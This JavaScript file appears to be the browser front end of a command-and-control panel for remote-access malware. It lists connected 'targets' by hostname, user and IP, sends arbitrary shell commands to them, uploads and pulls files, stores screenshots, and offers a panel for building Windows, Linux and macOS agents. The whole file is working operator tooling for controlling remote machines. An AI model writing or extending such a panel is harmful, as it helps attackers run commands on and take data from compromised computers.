// Global variables
let currentAgent = null;
let commandHistory = [];
let historyIndex = -1;

// Initialize when document loads
document.addEventListener('DOMContentLoaded', function() {
    // Initialize tabs
    const tabButtons = document.querySelectorAll('.tab-button');
    const tabPanes = document.querySelectorAll('.tab-pane');
    
    tabButtons.forEach(button => {
        button.addEventListener('click', () => {
            const tabName = button.getAttribute('data-tab');
            console.log('Switching to tab:', tabName);
            
            // Remove active class from all buttons and panes
            tabButtons.forEach(btn => btn.classList.remove('active'));
            tabPanes.forEach(pane => pane.classList.remove('active'));
            
            // Add active class to clicked button and corresponding pane
            button.classList.add('active');
            const targetPane = document.getElementById(`${tabName}-tab`);
            if (targetPane) {
                targetPane.classList.add('active');
                // Update content based on tab
                switch(tabName) {
                    case 'agents':
                        updateAgentsList();
                        break;
                    case 'command':
                        updateCommandCenter();
                        break;
                    case 'build':
                        initializeBuildPanel();
                        break;
                    case 'storage':
                        updateStorage();
                        break;
                }
            }
        });
    });

    // Start periodic updates for agents
    updateAgentsList();
    setInterval(updateAgentsList, 5000);
});

// Agents Tab Functions
function updateAgentsList() {
    fetch('/api/targets')
        .then(response => response.json())
        .then(agents => {
            const targetsList = document.getElementById('targets-list');
            if (!targetsList) return;

            if (agents.length === 0) {
                targetsList.innerHTML = `
                    <div class="no-agents">
                        <span class="material-icons">devices_off</span>
                        <p>No agents connected</p>
                    </div>`;
                return;
            }

            targetsList.innerHTML = agents.map(agent => `
                <div class="agent-item" data-id="${agent.id}">
                    <div class="agent-header">
                        <div class="status-badge ${isAgentActive(agent.last_seen) ? 'online' : 'offline'}"></div>
                        <div class="agent-name" onclick="editAlias(${agent.id}, '${agent.alias || `Agent_${agent.id}`}')">
                            <span>${agent.alias || `Agent_${agent.id}`}</span>
                            <span class="material-icons edit-icon">edit</span>
                        </div>
                        <div class="agent-os">${agent.os_type || 'Unknown'}</div>
                    </div>
                    <div class="agent-details">
                        <span><i class="material-icons">computer</i>${agent.hostname || 'Unknown'}</span>
                        <span><i class="material-icons">person</i>${agent.username || 'Unknown'}</span>
                        <span><i class="material-icons">router</i>${agent.ip}</span>
                    </div>
                    <div class="agent-actions">
                        <button onclick="commandAgent(${agent.id})" title="Command">
                            <span class="material-icons">terminal</span>
                        </button>
                        <button onclick="terminateAgent(${agent.id})" title="Terminate">
                            <span class="material-icons">power_settings_new</span>
                        </button>
                    </div>
                </div>
            `).join('');
        });
}

// Command Center Functions
function updateCommandCenter() {
    fetch('/api/targets')
        .then(response => response.json())
        .then(agents => {
            const agentList = document.getElementById('agent-list');
            const tabsContainer = document.getElementById('agent-tabs');
            if (!agentList || !tabsContainer) return;

            // Sort agents by last seen
            agents.sort((a, b) => new Date(b.last_seen) - new Date(a.last_seen));

            // Update agent list
            agentList.innerHTML = agents.map(agent => `
                <div class="agent-card ${currentAgent === agent.id ? 'active' : ''}" 
                     onclick="selectAgent(${agent.id})">
                    <div class="agent-card-header">
                        <div class="status-badge ${isAgentActive(agent.last_seen) ? 'online' : 'offline'}"></div>
                        <div class="agent-info">
                            <div class="agent-name">${agent.alias || `Agent_${agent.id}`}</div>
                            <div class="agent-os">${agent.os_type || 'Unknown'}</div>
                        </div>
                    </div>
                </div>
            `).join('');

            // Only update or create tabs that don't exist yet
            agents.forEach(agent => {
                let agentTab = document.getElementById(`agent-tab-${agent.id}`);
                
                // If tab doesn't exist, create it
                if (!agentTab) {
                    const tabHTML = `
                        <div id="agent-tab-${agent.id}" class="agent-tab ${currentAgent === agent.id ? 'active' : ''}" 
                             style="display: ${currentAgent === agent.id ? 'flex' : 'none'}">
                            <div class="agent-tab-header">
                                <div class="agent-info">
                                    <span class="agent-name">${agent.alias || `Agent_${agent.id}`}</span>
                                    <span class="agent-details">
                                        ${agent.os_type || 'Unknown'} | ${agent.ip} | ${agent.username}
                                    </span>
                                </div>
                                <div class="agent-actions">
                                    <button onclick="uploadFile(${agent.id})" title="Upload File">
                                        <span class="material-icons">upload</span>
                                    </button>
                                    <button onclick="downloadFile(${agent.id})" title="Download File">
                                        <span class="material-icons">download</span>
                                    </button>
                                    <button onclick="terminateAgent(${agent.id})" title="Terminate">
                                        <span class="material-icons">power_settings_new</span>
                                    </button>
                                </div>
                            </div>
                            <div class="terminal-container">
                                <div class="terminal-output" id="terminal-output-${agent.id}"></div>
                                <div class="terminal-input-container">
                                    <div class="terminal-input">
                                        <span class="prompt">$</span>
                                        <input type="text" 
                                               class="terminal-input-field" 
                                               id="terminal-input-${agent.id}" 
                                               placeholder="Enter command..."
                                               onkeypress="handleCommand(event, ${agent.id})">
                                    </div>
                                </div>
                            </div>
                        </div>
                    `;
                    tabsContainer.insertAdjacentHTML('beforeend', tabHTML);
                    
                    // Initialize terminal input for new tab
                    const input = document.getElementById(`terminal-input-${agent.id}`);
                    if (input) {
                        input.addEventListener('keydown', function(e) {
                            handleTerminalHistory(e, agent.id);
                        });
                    }
                }
            });

            // Only remove tabs for agents that have been explicitly terminated
            const existingTabs = tabsContainer.querySelectorAll('.agent-tab');
            existingTabs.forEach(tab => {
                const tabId = parseInt(tab.id.replace('agent-tab-', ''));
                const agentExists = agents.some(agent => agent.id === tabId);
                if (!agentExists && tab.dataset.terminated === 'true') {
                    tab.remove();
                }
            });
        });
}

// Build Tab Functions
function initializeBuildPanel() {
    const buildPanel = document.querySelector('.build-panel');
    buildPanel.innerHTML = `
        <h2>Build Agent</h2>
        <div class="build-options">
            <div class="option-group">
                <label>Platform</label>
                <select id="platform">
                    <option value="windows">Windows</option>
                    <option value="linux">Linux</option>
                    <option value="macos">MacOS</option>
                </select>
            </div>
            <div class="option-group">
                <label>Architecture</label>
                <select id="arch">
                    <option value="x64">x64</option>
                    <option value="x86">x86</option>
                </select>
            </div>
            <button onclick="buildAgent()" class="build-button">
                <span class="material-icons">build</span>
                Build Agent
            </button>
        </div>
        <div class="build-status"></div>
    `;
}

// Storage Tab Functions
function updateStorage() {
    fetch('/api/storage')
        .then(response => response.json())
        .then(data => {
            const storageContent = document.querySelector('.storage-content');
            storageContent.innerHTML = `
                <div class="storage-section">
                    <h3>Downloads</h3>
                    <div class="file-list" id="downloads-list"></div>
                </div>
                <div class="storage-section">
                    <h3>Screenshots</h3>
                    <div class="file-list" id="screenshots-list"></div>
                </div>
                <div class="upload-section">
                    <input type="file" id="file-upload" hidden>
                    <button onclick="document.getElementById('file-upload').click()">
                        <span class="material-icons">upload_file</span>
                        Upload File
                    </button>
                </div>
            `;
            updateFileList('downloads-list', data.downloads);
            updateFileList('screenshots-list', data.screenshots);
        });
}

// Helper Functions
function isAgentActive(lastSeen) {
    const lastSeenDate = new Date(lastSeen);
    const now = new Date();
    return (now - lastSeenDate) < 30000; // 30 seconds
}

function commandAgent(agentId) {
    currentAgent = agentId;
    document.querySelector('[data-tab="command"]').click();
}

function selectAgent(agentId) {
    currentAgent = agentId;
    
    // Update UI
    document.querySelectorAll('.agent-card').forEach(card => {
        card.classList.toggle('active', card.getAttribute('onclick').includes(agentId));
    });
    
    const terminal = document.querySelector('.agent-terminal');
    const noAgentMessage = document.querySelector('.no-agent-selected');
    
    if (terminal && noAgentMessage) {
        terminal.style.display = 'flex';
        noAgentMessage.style.display = 'none';
        
        // Clear terminal output
        const output = document.getElementById('terminal-output');
        if (output) {
            output.innerHTML = `Connected to Agent_${agentId}\n`;
        }
        
        // Focus input
        const input = document.getElementById('terminal-input');
        if (input) {
            input.focus();
        }
    }
}

// Command handling
document.addEventListener('DOMContentLoaded', function() {
    const terminalInput = document.getElementById('terminal-input');
    if (terminalInput) {
        terminalInput.addEventListener('keydown', function(e) {
            if (e.key === 'ArrowUp') {
                e.preventDefault();
                if (historyIndex < commandHistory.length - 1) {
                    historyIndex++;
                    this.value = commandHistory[historyIndex];
                }
            } else if (e.key === 'ArrowDown') {
                e.preventDefault();
                if (historyIndex > -1) {
                    historyIndex--;
                    this.value = historyIndex >= 0 ? commandHistory[historyIndex] : '';
                }
            }
        });

        terminalInput.addEventListener('keypress', function(e) {
            if (e.key === 'Enter') {
                const command = this.value.trim();
                if (!command) return;
                
                if (!currentAgent) {
                    appendToTerminal('No agent selected', 'error');
                    return;
                }
                
                // Add command to history
                commandHistory.unshift(command);
                historyIndex = -1;
                
                // Show command in terminal
                appendToTerminal(`$ ${command}`, 'command');
                
                // Send command to server
                fetch('/api/send_command', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        session_id: currentAgent,
                        command: command
                    })
                })
                .then(response => response.json())
                .then(data => {
                    if (data.error) {
                        appendToTerminal(data.error, 'error');
                    } else {
                        // Handle different response types
                        if (typeof data.output === 'object') {
                            if (data.output.error) {
                                appendToTerminal(data.output.error, 'error');
                            } else if (data.output.output) {
                                appendToTerminal(data.output.output);
                            } else {
                                // Pretty print the object
                                const output = Object.entries(data.output)
                                    .map(([key, value]) => `${key}: ${value}`)
                                    .join('\n');
                                appendToTerminal(output);
                            }
                        } else {
                            appendToTerminal(data.output);
                        }
                    }
                })
                .catch(error => {
                    appendToTerminal(`Error: ${error.message}`, 'error');
                });
                
                this.value = '';
            }
        });
    }
});

function appendToTerminal(text, type = 'output') {
    const terminal = document.getElementById('terminal-output');
    if (!terminal) return;
    
    const div = document.createElement('div');
    div.className = `terminal-${type}`;
    
    // Handle multiline text
    if (typeof text === 'string') {
        text.split('\n').forEach((line, index) => {
            if (index > 0) {
                terminal.appendChild(document.createElement('br'));
            }
            div.textContent = line;
            terminal.appendChild(div.cloneNode(true));
        });
    } else {
        div.textContent = String(text);
        terminal.appendChild(div);
    }
    
    terminal.scrollTop = terminal.scrollHeight;
}

function editAlias(agentId, currentAlias) {
    const agentName = document.querySelector(`.agent-item[data-id="${agentId}"] .agent-name`);
    const currentName = currentAlias.startsWith('Agent_') ? '' : currentAlias;
    
    // Create input element
    const input = document.createElement('input');
    input.type = 'text';
    input.value = currentName;
    input.className = 'alias-input';
    input.placeholder = `Agent_${agentId}`;
    
    // Replace span with input
    agentName.innerHTML = '';
    agentName.appendChild(input);
    input.focus();
    
    // Handle input events
    input.addEventListener('blur', () => saveAlias(agentId, input.value));
    input.addEventListener('keypress', (e) => {
        if (e.key === 'Enter') {
            input.blur();
        }
    });
}

function saveAlias(agentId, newAlias) {
    fetch('/api/set_alias', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            session_id: agentId,
            alias: newAlias.trim() || `Agent_${agentId}`
        })
    })
    .then(response => response.json())
    .then(() => {
        // Refresh the agents list to show the new alias
        updateAgentsList();
    })
    .catch(error => console.error('Error saving alias:', error));
}

function terminateAgent(agentId) {
    if (!confirm('Are you sure you want to terminate this agent?')) {
        return;
    }

    // Mark the tab as terminated
    const agentTab = document.getElementById(`agent-tab-${agentId}`);
    if (agentTab) {
        agentTab.dataset.terminated = 'true';
    }

    // Send quit command to agent
    fetch('/api/send_command', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            session_id: agentId,
            command: 'quit'
        })
    })
    .then(response => response.json())
    .catch(() => {
        // If there's an error (no response), we still want to remove the agent
        console.log('No response from agent, forcing removal');
        return { force_remove: true };
    })
    .then((data) => {
        // Remove agent from UI whether we got a response or not
        removeAgentFromUI(agentId);
        
        // If we didn't get a response, force remove from server
        if (data.force_remove) {
            forceRemoveAgent(agentId);
        }
    })
    .catch(error => console.error('Error in termination process:', error));
}

function removeAgentFromUI(agentId) {
    // Remove from agents list
    const agentElement = document.querySelector(`.agent-item[data-id="${agentId}"]`);
    if (agentElement) {
        agentElement.remove();
    }
    
    // If this was the current agent in command center, clear it
    if (currentAgent === agentId) {
        currentAgent = null;
        const terminal = document.getElementById('terminal-output');
        if (terminal) {
            terminal.innerHTML = '<div class="terminal-error">Agent disconnected</div>';
        }
    }
    
    // Update command center agent list
    updateCommandCenter();
}

function forceRemoveAgent(agentId) {
    // Force remove from server
    fetch('/api/force_remove_agent', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            session_id: agentId
        })
    })
    .catch(error => console.error('Error forcing agent removal:', error));
}

function uploadFile(agentId) {
    const fileInput = document.createElement('input');
    fileInput.type = 'file';
    fileInput.onchange = function() {
        const file = fileInput.files[0];
        if (!file) return;

        const formData = new FormData();
        formData.append('file', file);
        formData.append('session_id', agentId);

        fetch('/api/send_file', {
            method: 'POST',
            body: formData
        })
        .then(response => response.json())
        .then(data => {
            if (data.error) {
                appendToTerminal(`Error uploading file: ${data.error}`, 'error');
            } else {
                appendToTerminal(data.message, 'success');
            }
        })
        .catch(error => {
            appendToTerminal(`Upload failed: ${error}`, 'error');
        });
    };
    fileInput.click();
}

function downloadFile(agentId) {
    const filename = prompt('Enter the file path to download:');
    if (!filename) return;

    fetch('/api/download_file', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            session_id: agentId,
            filename: filename
        })
    })
    .then(response => response.json())
    .then(data => {
        if (data.error) {
            appendToTerminal(`Error downloading file: ${data.error}`, 'error');
        } else {
            appendToTerminal(data.message, 'success');
        }
    })
    .catch(error => {
        appendToTerminal(`Download failed: ${error}`, 'error');
    });
}

function handleCommand(event, agentId) {
    if (event.key === 'Enter') {
        const input = document.getElementById(`terminal-input-${agentId}`);
        const command = input.value.trim();
        if (!command) return;

        // Add to history
        if (!commandHistory[agentId]) {
            commandHistory[agentId] = [];
        }
        commandHistory[agentId].unshift(command);
        historyIndex = -1;

        // Show command in terminal
        appendToTerminal(`$ ${command}`, 'command', agentId);

        // Send command
        fetch('/api/send_command', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                session_id: agentId,
                command: command
            })
        })
        .then(response => response.json())
        .then(data => {
            if (data.error) {
                appendToTerminal(data.error, 'error', agentId);
            } else {
                if (typeof data.output === 'object') {
                    if (data.output.error) {
                        appendToTerminal(data.output.error, 'error', agentId);
                    } else if (data.output.output) {
                        appendToTerminal(data.output.output, 'output', agentId);
                    } else {
                        const output = Object.entries(data.output)
                            .map(([key, value]) => `${key}: ${value}`)
                            .join('\n');
                        appendToTerminal(output, 'output', agentId);
                    }
                } else {
                    appendToTerminal(data.output, 'output', agentId);
                }
            }
        })
        .catch(error => {
            appendToTerminal(`Error: ${error.message}`, 'error', agentId);
        });

        input.value = '';
    }
}

function appendToTerminal(text, type = 'output', agentId) {
    const terminal = document.getElementById(`terminal-output-${agentId}`);
    if (!terminal) return;

    const div = document.createElement('div');
    div.className = `terminal-${type}`;

    if (typeof text === 'string') {
        text.split('\n').forEach((line, index) => {
            if (index > 0) {
                terminal.appendChild(document.createElement('br'));
            }
            div.textContent = line;
            terminal.appendChild(div.cloneNode(true));
        });
    } else {
        div.textContent = String(text);
        terminal.appendChild(div);
    }

    terminal.scrollTop = terminal.scrollHeight;
} 